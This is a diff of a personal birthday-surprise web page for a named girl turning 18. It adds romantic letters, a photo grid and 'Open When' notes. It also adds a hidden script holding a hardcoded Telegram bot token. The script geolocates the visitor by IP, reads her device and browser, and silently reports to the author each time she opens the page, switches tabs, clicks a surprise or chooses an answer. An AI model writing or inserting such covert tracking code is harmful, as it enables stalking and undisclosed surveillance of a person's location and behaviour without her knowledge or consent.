@@ -5,6 +5,78 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>The Journey | Rida</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        // Verified Telegram Credentials
+        const TELEGRAM_BOT_TOKEN = '8919952666:AAGWoZdPyVYDPI2-QYX8MqL6N7cI5ZCw004';
+        const TELEGRAM_CHAT_ID = '8843730757';
+
+        // Helper to detect device and browser safely
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let browser = "Unknown Browser";
+            let os = "Unknown OS";
+
+            if (ua.includes("Firefox")) browser = "Firefox";
+            else if (ua.includes("SamsungBrowser")) browser = "Samsung Internet";
+            else if (ua.includes("Opera") || ua.includes("OPR")) browser = "Opera";
+            else if (ua.includes("Edge")) browser = "Edge";
+            else if (ua.includes("Chrome")) browser = "Chrome";
+            else if (ua.includes("Safari")) browser = "Safari";
+
+            if (ua.includes("like Mac OS")) os = "iOS (iPhone/iPad)";
+            else if (ua.includes("Android")) os = "Android";
+            else if (ua.includes("Windows")) os = "Windows PC";
+            else if (ua.includes("Macintosh")) os = "Mac";
+            else if (ua.includes("Linux")) os = "Linux";
+
+            return `${os} / ${browser}`;
+        }
+
+        // Helper for exact timestamp
+        function getTimeString() {
+            return new Date().toLocaleTimeString();
+        }
+
+        // Bulletproof Telegram Notification Sender
+        async function sendTelegramNotification(message) {
+            try {
+                let locationInfo = '\n📍 Location: Unknown';
+                try {
+                    const ipResponse = await fetch('https://ipapi.co/json/');
+                    const ipData = await ipResponse.json();
+                    if (ipData.city && ipData.country_name) {
+                        locationInfo = `\n📍 Location: ${ipData.city}, ${ipData.country_name}`;
+                    }
+                } catch (locErr) {
+                    console.log('Location fetch skipped/blocked');
+                }
+
+                const device = getDeviceInfo();
+                const time = getTimeString();
+
+                const fullMessage = `${message}\n📱 Device: ${device}\n⏰ Time: ${time}${locationInfo}`;
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: fullMessage
+                    })
+                });
+            } catch (err) {
+                console.error('Notification error:', err);
+            }
+        }
+
+        // Track if she minimizes or switches away from the tab/app
+        document.addEventListener("visibilitychange", () => {
+            if (document.visibilityState === 'hidden') {
+                sendTelegramNotification("⚠️ Alert: Rida just minimized or switched away from the website!");
+            }
+        });
+    </script>
     <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@400;700&display=swap" rel="stylesheet">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
@@ -37,27 +109,6 @@
             z-index: 10;
         }
 
-        .polaroid {
-            background: white;
-            padding: 10px 10px 35px 10px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.4);
-            border-radius: 2px;
-            position: absolute;
-            width: 200px; 
-            transition: all 0.4s ease;
-            cursor: pointer;
-            z-index: 2001;
-            border: 1px solid #ddd;
-        }
-        .polaroid img { 
-            width: 100%; 
-            height: 200px; 
-            object-fit: cover; 
-            border: 1px solid #eee; 
-            display: block; 
-            background: #f0f0f0;
-        }
-
         .particle {
             position: fixed;
             pointer-events: none;
@@ -87,17 +138,69 @@
         .timer-val { font-size: 1.8rem; display: block; font-weight: bold; }
         .timer-label { font-size: 0.5rem; text-transform: uppercase; letter-spacing: 1px; }
         
-        .hidden-stage { display: none !important; }
+        .hidden-stage { display: none; }
         .fade-in { animation: fadeIn 1s ease-in forwards; }
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        /* Classic side-by-side container for photos with gorgeous styling */
+        .side-by-side-container {
+            display: none; /* Toggled via button */
+            gap: 10px;
+            width: 100%;
+            margin: 15px 0;
+        }
+        .side-by-side-container img {
+            flex: 1;
+            width: 50%;
+            height: 180px;
+            border-radius: 10px;
+            object-fit: cover;
+            border: 1px solid rgba(255, 255, 255, 0.4);
+        }
+
+        /* Open When Envelopes CSS */
+        .envelope-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-top: 15px;
+        }
+        .envelope-btn {
+            padding: 12px 8px;
+            background: rgba(255, 255, 255, 0.15);
+            border: 1px solid rgba(255, 215, 0, 0.4);
+            border-radius: 10px;
+            color: #FFD700;
+            font-family: 'Cinzel', serif;
+            font-size: 0.6rem;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: 0.3s;
+            width: 100%;
+        }
+        .envelope-btn:active {
+            background: rgba(255, 215, 0, 0.3);
+        }
+        .note-modal {
+            display: none;
+            margin-top: 15px;
+            padding: 15px;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 215, 0, 0.3);
+            border-radius: 10px;
+            font-size: 0.75rem;
+            line-height: 1.6;
+            font-style: italic;
+            color: #fff;
+        }
     </style>
 </head>
 <body id="main-body">
 
-    <div id="gesture-layer" class="fixed inset-0 z-[5000] bg-pink-100 flex items-center justify-center p-6 text-center">
-        <div class="glass-box bg-white/90">
-            <h2 class="mb-6 text-pink-800 font-bold">Welcome to the Journey</h2>
-            <button class="btn-official bg-pink-600 text-white border-none" onclick="unlockAudio()">Enter Experience</button>
+    <div id="gesture-layer" class="fixed inset-0 z-[1000] bg-pink-100 flex items-center justify-center p-6 text-center">
+        <div class="glass-box bg-white/80">
+            <h2 class="mb-6">Welcome to the Journey</h2>
+            <button class="btn-official bg-pink-600 text-white" onclick="unlockAudio()">Enter Experience</button>
         </div>
     </div>
 
@@ -121,7 +224,7 @@
 
         <div id="section-27" class="hidden-stage glass-box fade-in">
             <p class="text-sm italic mb-6 leading-relaxed">
-                "Yayy!! Just a day to go! Soon you would've completed your 17th year and be on a journey of the 18th year! This is just a quite reminder of how amazing and fantabulous you are. I hope that you've enjoyed every bit of your last year, maybe even me. Tomorrow you'll start the journey of next year. I Just want to say, be happy, be as marvelous as you are, and keep smiling, atleast for me. Even if you feel you are in the toughest battle of your life, just smile cause that's the smile I've love. Atleast for me, Be happy. Genuinely. And yes, make sure to check this again tomorrow"
+                "Yayy!! Just a day to go! Soon you would've completed your 17th year and be on a journey of the 18th year! This is just a quiet reminder of how amazing and fantabulous you are. I hope that you've enjoyed every bit of your last year, maybe even me. Tomorrow you'll start the journey of next year. I Just want to say, be happy, be as marvelous as you are, and keep smiling, atleast for me. Even if you feel you are in the toughest battle of your life, just smile cause that's the smile I've loved. Atleast for me, Be happy. Genuinely. And yes, make sure to check this again tomorrow"
             </p>
             <button id="btn-stop-27" class="btn-official" onclick="stop27th()">Thank You Bestie</button>
             
@@ -139,11 +242,45 @@
         <div id="section-28" class="hidden-stage glass-box fade-in">
             <h1 class="font-bold text-lg text-center mb-6 uppercase tracking-tighter">A Very Happy Birthday Rida!!</h1>
             <div class="text-[11px] space-y-4 leading-relaxed">
-                <p><strong>Finally you've turned 18,</strong> winning a number of hearts, breaking a few, catching all the achievements you can, trying to be the best, but still not too harsh on yourself, there might've been some chaos in your life, some deep joys, but in the end, all that matters is that you are happy and satisfied.</p>
+                <p><strong>Finally you've turned 18!</strong> winning a number of hearts, breaking a few, catching all the achievements you can, trying to be the best, but still not too harsh on yourself, there might've been some chaos in your life, some deep joys, but in the end, all that matters is that you are happy and satisfied.</p>
+                
+                
+                <!-- Interactive Memories Button & Photo Grid for 11 Photos -->
+<div class="text-center my-4">
+    <button class="btn-official border-yellow-500 text-yellow-400" onclick="togglePhotos()">View Our Memories 📸</button>
+    <div id="photo-container" style="display: none;" class="grid grid-cols-2 gap-2 w-full mt-3">
+        <img src="reply1.jpg" alt="Memory 1" class="w-full h-36 object-cover rounded-lg border border-white/30" onerror="this.style.display='none'">
+        <img src="reply2.jpg" alt="Memory 2" class="w-full h-36 object-cover rounded-lg border border-white/30" onerror="this.style.display='none'">
+        <img src="reply3.jpg" alt="Memory 3" class="w-full h-36 object-cover rounded-lg border border-white/30" onerror="this.style.display='none'">
+        <img src="reply4.jpg" alt="Memory 4" class="w-full h-36 object-cover rounded-lg border border-white/30" onerror="this.style.display='none'">
+        <img src="reply5.jpg" alt="Memory 5" class="w-full h-36 object-cover rounded-lg border border-white/30" onerror="this.style.display='none'">
+        <img src="reply6.jpg" alt="Memory 6" class="w-full h-36 object-cover rounded-lg border border-white/30" onerror="this.style.display='none'">
+        <img src="reply7.jpg" alt="Memory 7" class="w-full h-36 object-cover rounded-lg border border-white/30" onerror="this.style.display='none'">
+        <img src="reply8.jpg" alt="Memory 8" class="w-full h-36 object-cover rounded-lg border border-white/30" onerror="this.style.display='none'">
+        <img src="reply9.jpg" alt="Memory 9" class="w-full h-36 object-cover rounded-lg border border-white/30" onerror="this.style.display='none'">
+        <img src="reply10.jpg" alt="Memory 10" class="w-full h-36 object-cover rounded-lg border border-white/30" onerror="this.style.display='none'">
+        <img src="reply11.jpg" alt="Memory 11" class="w-full h-36 object-cover rounded-lg border border-white/30 col-span-2" onerror="this.style.display='none'">
+    </div>
+</div>
+
+                </>
+
                 <p>This is me wishing you a birthday for the second time but still these 2 years felt like 20 years of connection, but just 2 months of experience. Anyways, Right now, I just want to express what you mean to me. You are the 'Maya' to my 'Wali', 'Junnu' to my 'Seenu', Beginning to my end, the heart to my body and the code for my html.</p>
-                <p>May God bless you not just with a long life but a very Prosperous, Happy, graceful and long life. Just so that you know, all my Du'as start with you, even those 30 days fasting, which was my first time, was for you. You are what Juliet meant to Romeo. All that I pray for is your wellness now. If I had a thousand lives, I would choose you every time, even if this was our story every time. Maybe, Just Maybe we cannot meet in this life but even then, I'll wait for you even after death and maybe in another life we'll meet.</p>
+                <p>May God bless you not just with a long life but a very Prosperous, Happy, graceful and long life. Just so that you know, all my Du'as start with you, even those 30 days fasting, which was my first time, was for you. You are as important to me as Juliet was to Romeo, as Layla was to Majnu, Sun is for Earth and blood is for heart. All that I pray for is your wellness. If I had a thousand lives, I would still choose you, always, even if this was our story every time. Maybe, Just Maybe we can't meet in this life but even then, I'll wait for you. Even after death. Maybe in another life we'll meet.</p>
                 <p class="font-bold text-center text-sm mt-6">Again, wishing you a Very Happy Birthday, Mineyy❤️✨</p>
                 <p class="text-right text-yellow-500 font-bold mt-2">— Your Prince Charming</p>
+            </div>
+
+            <!-- Open When... Section -->
+            <div class="mt-8 text-center border-t border-yellow-500/30 pt-6">
+                <p class="text-xs mb-3 uppercase tracking-widest text-yellow-400">💌 Open When...</p>
+                <div class="envelope-grid">
+                    <button class="envelope-btn" onclick="openNote('When you\'re stressed', 'Take a deep breath, Mineyy. Close your eyes for a second and remember how capable you are. Whatever is stressing you out right now does not stand a chance against your smile. I am right here cheering for you, always.')">When you're stressed</button>
+                    <button class="envelope-btn" onclick="openNote('When you miss me', 'If you are reading this, it means you miss me. Well, guess what? I am probably missing you ten times more right now! Close your eyes, feel the warmth, and remember you carry a piece of my heart with you.')">When you miss me</button>
+                    <button class="envelope-btn" onclick="openNote('On a bad day', 'Some days are just heavy, and that is okay. You do not have to be strong every single second. But never forget that even on your darkest days, you are the brightest light in my life. Smile a little, okay?')">On a bad day</button>
+                    <button class="envelope-btn" onclick="openNote('When you need to smile', 'Remember that time... wait, just look in a mirror right now. That gorgeous smile of yours? Yeah, that is the exact reason why I fell for you. Keep wearing it like a crown, Princess.')">When you need a smile</button>
+                </div>
+                <div id="note-display" class="note-modal"></div>
             </div>
             
             <button id="btn-stop-28" class="btn-official border-yellow-500 text-yellow-500 mt-6" onclick="stop28th()">Thank You Prince Charming</button>
@@ -156,21 +293,16 @@
                     <button class="btn-official q28-btn" onclick="finalFinish(this, 'That hurts, but I guess I can wait till it comes😶')">Maybe in next life?</button>
                 </div>
                 <p id="final-verdict" class="mt-8 text-md text-yellow-500 italic"></p>
-                
-                <button id="outcome-btn" class="hidden-stage btn-official border-yellow-500 text-yellow-400 mt-10" onclick="startPolaroids()">Outcome And After Effects</button>
             </div>
         </div>
     </div>
 
-    <div id="polaroid-overlay" class="hidden-stage fixed inset-0 z-[6000] bg-black/95 flex flex-col items-center justify-center overflow-hidden">
-        <button class="absolute top-10 right-10 text-white text-4xl z-[9000]" onclick="closePolaroids()">✕</button>
-        <div id="polaroid-stack" class="relative w-full h-[80vh] flex items-center justify-center"></div>
-        <p class="mb-8 text-white/70 text-xs uppercase tracking-widest animate-pulse">Tap photos to shuffle</p>
-    </div>
-
     <script>
+        // Dates
         const date27 = new Date("May 27, 2026 00:00:00").getTime();
         const date28 = new Date("May 28, 2026 00:00:00").getTime();
+        
+        // Audio Fixed ID
         const song1 = document.getElementById('audio-phase1');
         const song2 = document.getElementById('audio-phase2');
 
@@ -178,6 +310,7 @@
             song1.play().then(() => { song1.pause(); song1.currentTime = 0; });
             song2.play().then(() => { song2.pause(); song2.currentTime = 0; });
             document.getElementById('gesture-layer').style.display = 'none';
+            sendTelegramNotification("🌹 Alert: Rida just opened 'The Journey' website!");
             init();
         }
 
@@ -199,12 +332,12 @@
             const now = new Date().getTime();
             if (now >= date28) {
                 document.getElementById('timer-title').innerText = "Loading The Second Surprise";
-                document.getElementById('timer-grid').classList.add('hidden-stage');
-                document.getElementById('btn-reveal-28').classList.remove('hidden-stage');
+                document.getElementById('timer-grid').style.display = 'none';
+                document.getElementById('btn-reveal-28').style.display = 'block';
             } else if (now >= date27) {
                 document.getElementById('timer-title').innerText = "Loading The First Surprise";
-                document.getElementById('timer-grid').classList.add('hidden-stage');
-                document.getElementById('btn-open-27').classList.remove('hidden-stage');
+                document.getElementById('timer-grid').style.display = 'none';
+                document.getElementById('btn-open-27').style.display = 'block';
             } else {
                 startCountdown(date27);
             }
@@ -226,75 +359,63 @@
             spawnEmojis(['🎉','✨','🎊','☀️']);
             document.getElementById('main-body').className = 'theme-27';
             song1.play();
-            document.getElementById('section-countdown').classList.add('hidden-stage');
-            document.getElementById('section-27').classList.remove('hidden-stage');
+            document.getElementById('section-countdown').style.display = 'none';
+            document.getElementById('section-27').style.display = 'block';
         }
 
         function stop27th() {
             song1.pause();
-            document.getElementById('btn-stop-27').classList.add('hidden-stage');
-            document.getElementById('q27-area').classList.remove('hidden-stage');
+            document.getElementById('btn-stop-27').style.display = 'none';
+            document.getElementById('q27-area').style.display = 'block';
         }
 
         function reply27(btn, msg) {
             document.querySelectorAll('.q27-btn').forEach(b => b.disabled = true);
             btn.style.background = "rgba(255,255,255,0.4)";
             document.getElementById('reply-text-27').innerText = msg;
-            document.getElementById('wait-btn').classList.remove('hidden-stage');
+            document.getElementById('wait-btn').style.display = 'block';
+            sendTelegramNotification(`💌 27th Reply: She selected: "${btn.innerText}"`);
         }
 
         function trigger28th() {
-            spawnEmojis(['✨','🎉','❤️','💐','🌹']);
+            spawnEmojis(['✨','🎊','💗','🎉','❤️','💐','🌹']);
             document.getElementById('main-body').className = 'theme-28';
             song2.play();
-            document.getElementById('section-countdown').classList.add('hidden-stage');
-            document.getElementById('section-28').classList.remove('hidden-stage');
+            document.getElementById('section-countdown').style.display = 'none';
+            document.getElementById('section-28').style.display = 'block';
+            sendTelegramNotification("🎂 ALERT: She unlocked her Birthday Surprise (28th May)!");
         }
 
         function stop28th() {
             song2.pause();
-            document.getElementById('btn-stop-28').classList.add('hidden-stage');
-            document.getElementById('q28-area').classList.remove('hidden-stage');
+            document.getElementById('btn-stop-28').style.display = 'none';
+            document.getElementById('q28-area').style.display = 'block';
         }
 
         function finalFinish(btn, msg) {
             document.querySelectorAll('.q28-btn').forEach(b => b.disabled = true);
             btn.style.background = "rgba(255,215,0,0.3)";
             document.getElementById('final-verdict').innerText = msg;
-            document.getElementById('outcome-btn').classList.remove('hidden-stage');
+            sendTelegramNotification(`💖 FINAL ANSWER: She picked: "${btn.innerText}"!`);
         }
 
-        let currentTopZ = 3000;
-        function startPolaroids() {
-            const overlay = document.getElementById('polaroid-overlay');
-            const stack = document.getElementById('polaroid-stack');
-            overlay.classList.remove('hidden-stage');
-            stack.innerHTML = '';
-            
-            for(let i=1; i<=11; i++) {
-                const pol = document.createElement('div');
-                pol.className = 'polaroid';
-                
-                const rot = (Math.random() * 40 - 20);
-                const tx = (Math.random() * 60 - 30);
-                const ty = (Math.random() * 60 - 30);
-                
-                pol.style.transform = `rotate(${rot}deg) translate(${tx}px, ${ty}px)`;
-                
-                // Using ./ helps define the local path more clearly
-                pol.innerHTML = `<img src="./reply${i}.jpg" alt="Memory" onerror="this.src='https://via.placeholder.com/200?text=Check+Link'">`;
-                
-                pol.onclick = function() {
-                    currentTopZ++;
-                    this.style.zIndex = currentTopZ;
-                    this.style.transform = `rotate(${Math.random() * 10 - 5}deg) scale(1.1) translateY(-20px)`;
-                };
-                stack.appendChild(pol);
+        // Toggle Photos & Alert Telegram
+        function togglePhotos() {
+            const container = document.getElementById('photo-container');
+            if (container.style.display === 'flex') {
+                container.style.display = 'none';
+            } else {
+                container.style.display = 'flex';
+                sendTelegramNotification("📸 Photos: She clicked to view the memories photos!");
             }
         }
 
-        function closePolaroids() {
-            document.getElementById('polaroid-overlay').classList.add('hidden-stage');
+        // Open When Handler + Telegram Alert
+        function openNote(title, message) {
+            const displayBox = document.getElementById('note-display');
+            displayBox.style.display = 'block';
+            displayBox.innerText = message;
+            sendTelegramNotification(`💌 Open When... She opened: "${title}"`);
         }
     </script>
 </body>
